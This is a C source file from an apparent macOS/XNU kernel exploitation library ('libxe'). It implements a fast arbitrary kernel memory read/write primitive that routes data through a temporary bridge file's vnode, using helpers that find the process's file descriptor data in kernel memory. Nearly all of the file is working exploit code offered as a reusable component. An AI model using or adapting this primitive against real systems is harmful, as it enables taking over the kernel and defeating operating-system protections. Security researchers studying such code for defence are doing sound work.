//
//  kmem_fast.c
//  libxe
//
//  Created by sreejith on 3/12/22.
//

#include <limits.h>

#include <sys/fcntl.h>

#include "memory/kmem_fast.h"
#include "memory/kmem.h"
#include "memory/kmem_internal.h"
#include "xnu/proc.h"
#include "util/vnode.h"
#include "util/msdosfs.h"
#include "util/assert.h"
#include "util/log.h"


///
/// This module provides a fast arbitary kernel memory read / write primitive by using the
/// module `utils/vnode.c` to read / write data from / to arbitrary kernel memory location
/// via a vnode to a open file. To write data to a arbitary kernel memory location `dst`, from
/// user memory `src` of size `length`, the data `src` is first written to a open file `bridge_fd`.
/// Then we use `xe_util_vnode_read_kernel` method to copy the data in `bridge_vnode` to
/// `dst`. Similarly to read data from a arbitary kernel memory location `src` of size `length` to
/// user memory `dst`, we use `xe_util_vnode_write_kernel` method to copy the data from
/// `src` to `bridge_vnode` and then we read the data from `bridge_fd` to user buffer `dst`
///


typedef struct xe_memory_kmem_fast {
    xe_util_vnode_t util_vnode;
    int bridge_fd;
    uintptr_t bridge_vnode;
    char bridge_path[PATH_MAX];
} *xe_memory_kmem_fast_t;


void xe_memory_kmem_fast_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_memory_kmem_fast_t kmem = (xe_memory_kmem_fast_t)ctx;
    
    int res = ftruncate(kmem->bridge_fd, size);
    xe_assert_errno(res);
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xe_assert_errno(off < 0);
    
    /// Copy data from `src` to `bridge_fd`
    xe_util_vnode_write_kernel(kmem->util_vnode, kmem->bridge_vnode, src, size);
    
    ssize_t bytes_read = read(kmem->bridge_fd, dst, size);
    xe_assert_cond(bytes_read, ==, size)
}


void xe_memory_kmem_fast_write(void* ctx, uintptr_t dst, const void* src, size_t size) {
    xe_memory_kmem_fast_t kmem = (xe_memory_kmem_fast_t)ctx;
    
    int res = ftruncate(kmem->bridge_fd, size);
    xe_assert_errno(res);
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xe_assert_errno(off < 0);
    ssize_t bytes_written = write(kmem->bridge_fd, src, size);
    xe_assert_cond(bytes_written, ==, size);
    
    /// Copy data from `bridge_fd` to `dst`
    xe_util_vnode_read_kernel(kmem->util_vnode, kmem->bridge_vnode, dst, size);
}


const static struct xe_kmem_ops xe_memory_kmem_fast_ops = {
    .read = xe_memory_kmem_fast_read,
    .write = xe_memory_kmem_fast_write,
    .max_read_size = 1024,
    .max_write_size = 1024,
};


xe_kmem_backend_t xe_memory_kmem_fast_create(const char* base_img_path) {
    xe_util_msdosfs_loadkext();
    
    char bridge_path[] = "/tmp/xe_kmem_fast_bridge.XXXXXXXXX";
    int fd_bridge = mkostemp(bridge_path, O_EXLOCK);
    xe_assert_errno(fd_bridge < 0);
    uintptr_t vnode_bridge;
    int error = xe_xnu_proc_find_fd_data(xe_xnu_proc_current_proc(), fd_bridge, &vnode_bridge);
    xe_assert_err(error);
    xe_log_debug("bridge file opened at fd: %d, vnode: %p", fd_bridge, (void*)vnode_bridge);
    
    xe_memory_kmem_fast_t kmem = malloc(sizeof(struct xe_memory_kmem_fast));
    kmem->bridge_fd = fd_bridge;
    kmem->bridge_vnode = vnode_bridge;
    kmem->util_vnode = xe_util_vnode_create();
    strlcpy(kmem->bridge_path, bridge_path, sizeof(kmem->bridge_path));
    
    return xe_kmem_backend_create(&xe_memory_kmem_fast_ops, kmem);
}


void xe_memory_kmem_fast_destroy(xe_kmem_backend_t* backend_p) {
    xe_memory_kmem_fast_t kmem = xe_kmem_backend_get_ctx(*backend_p);
    xe_util_vnode_destroy(&kmem->util_vnode);
    close(kmem->bridge_fd);
    remove(kmem->bridge_path);
    free(kmem);
    xe_kmem_backend_destroy(backend_p);
}
